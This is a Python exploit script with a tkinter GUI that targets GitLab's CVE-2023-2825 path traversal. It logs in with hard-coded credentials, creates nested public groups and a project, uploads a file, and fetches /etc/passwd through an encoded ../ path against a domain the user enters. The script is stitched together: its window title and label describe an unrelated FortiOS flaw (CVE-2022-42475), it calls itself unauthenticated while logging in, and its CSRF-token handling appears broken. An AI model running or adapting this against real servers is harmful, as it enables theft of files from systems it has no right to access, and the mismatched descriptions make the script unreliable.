# CVE-2023-2825 - GitLab Unauthenticated arbitrary file read

# Vendor advisory: https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/
#
# This Proof Of Concept leverages a path traversal vulnerability
# to retrieve the /etc/passwd file from a system running GitLab 16.0.0.
#

import requests
import random
import string
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
import requests

root = tkinter.Tk()
root.title("CVE_2022_42475_RCE_POC exploits")
root.geometry('600x400+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack domin : "+inp)
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    txtarea.pack(fill=BOTH, expand=1)
    ENDPOINT = inp
    USERNAME = "root"
    PASSWORD = "toor"
    # Session for cookies
    session = requests.Session()
    # CSRF token
    csrf_token = ""
    # Ignore invalid SSL
    requests.urllib3.disable_warnings()
    def request(method, path, data=None, files=None, headers=None):
        global csrf_token

        if method == "POST" and isinstance(data, dict):
            data["authenticity_token"] = csrf_token
        response = session.request(method,f"{ENDPOINT}{path}",data=data,files=files,headers=headers,verify=False,)
        if response.status_code != 200:
            print(response.text)
            print(f"[*] Request failed: {method} - {path} => {response.status_code}")
            exit(1)
        if response.headers["content-type"].startswith("text/html"):
            csrf_token = BeautifulSoup(response.text, "html.parser").find("meta", {"name": "csrf-token"})["content"]
        return response
# Get initial CSRF token
    request("GET", "")
# Login
    print("[*] Attempting to login...")
    request("POST","/users/sign_in",data={"user[login]": USERNAME, "user[password]": PASSWORD},)
    print(f"[*] Login successful as user '{USERNAME}'")
# Create groups
    group_prefix = "".join(random.choices(string.ascii_uppercase + string.digits, k=3))
    print(f"[*] Creating 11 groups with prefix {group_prefix}")
    parent_id = ""
    for i in range(1, 12):
    # Create group
        name = f"{group_prefix}-{i}"
        create_resp = request("POST","/groups",data={"group[parent_id]": parent_id,"group[name]": name,"group[path]": name,"group[visibility_level]": 20,"user[role]": "software_developer","group[jobs_to_be_done]": "",},)
    # Get group id
        parent_id = BeautifulSoup(create_resp.text, "html.parser").find("button", {"title": "Copy group ID"})["data-clipboard-text"]
        print(f"[*] Created group '{name}'")
# Create project
    project_resp = request("POST","/projects",data={"project[ci_cd_only]": "false","project[name]": "CVE-2023-2825","project[selected_namespace_id]": parent_id,"project[namespace_id]": parent_id,"project[path]": "CVE-2023-2825","project[visibility_level]": 20,"project[initialize_with_readme": 1,},)
    repo_path = urlparse(project_resp.url).path
    print(f"[*] Created public repo '{repo_path}'")
# Upload file
    file_resp = request("POST",f"/{repo_path}/uploads",files={"file": "hello world"},headers={"X-CSRF-Token": csrf_token},)
    file_url = file_resp.json()["link"]["url"]
    print(f"[*] Uploaded file '{file_url}'")
# Get /etc/passwd
    exploit_path = f"/{repo_path}{file_url.split('file')[0]}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
    print(f"[*] Executing exploit, fetching file '/etc/passwd': GET - {exploit_path}")
    exploit_resp = request("GET", exploit_path)
    print(f"\n{exploit_resp.text}")

Hacher = Label(root, text="A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through \n7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and \nearlier and FortiProxy SSL-VPN 7.2.0 through 7.2.1, 7.0.7 and earlier may allow a remote\n unauthenticated attacker to execute arbitrary code or \ncommands via specifically crafted requests.").pack()  
Hacher = Label(root, text="Enter domin www.example.com : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()